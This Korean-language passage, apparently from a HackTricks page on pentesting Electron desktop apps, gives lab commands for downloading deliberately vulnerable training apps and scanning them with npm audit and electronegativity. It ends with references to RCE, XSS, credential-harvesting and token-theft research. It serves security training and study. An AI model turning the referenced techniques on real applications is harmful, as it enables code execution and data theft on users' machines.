[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)에서 취약한 Electron 앱을 익스플로잇하는 실습을 확인할 수 있습니다.<sup>[[4]](#references)</sup>

다음 명령으로 실습을 진행할 수 있습니다:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

기존 북마크에 사용되던 이전 주소: [Electron 데스크톱 앱](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). 전체 페이지 경로는 여기로 리디렉션되며, 이전 fragment는 유지 관리되지 않습니다.

## References

- [1] [Electron 애플리케이션의 피싱 및 자격 증명 수집](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App의 임의 파일 읽기](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: context isolation 부재 악용 - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [XSS와 RCE를 이용한 최신 데스크톱 앱 해킹 워크숍](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - Electron.js (비)보안 관련 자료 모음](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Electron API 오용: 공격자가 가장 먼저 선택하는 수단](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE 페이로드](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [Electron 애플리케이션에서 원클릭 RCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Electron의 shell.openExternal()의 위험성 - 원격 코드 실행으로 이어지는 다양한 경로](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [임의 URL을 허용하면 임의 코드 실행을 예상하라](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [오래된 Electron 기능으로 유명한 일본 채팅 도구에서 RCE 달성](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - 원격 코드 실행](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - 제한 모드에서의 원격 코드 실행 (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [VS Code Webview 키보드 이벤트 주입을 통한 원클릭 GitHub 토큰 탈취](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code 이슈 #319593: Webview에서 기본 workbench의 임의 키보드 단축키를 실행할 수 있음](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: 노트북 열기 확인 및 호출자가 제공하는 installExtension context 수락 중단](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: 노트북 Webview에서 프로그래밍 방식의 webview 키 누름/클릭 재전달 차단](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / 로컬 workspace 확장](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: 2주 만에 모든 주요 IDE를 해킹한 방법](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Electron의 새로운 공격 표면을 발견하며 인기 데스크톱 앱 장악하기](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron 보안](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: 무엇이든 역공학하기](https://github.com/morluto/rea)
- [24] [REA JavaScript 아티팩트 재구성](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA 계층 간 JavaScript 애플리케이션 워크플로](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
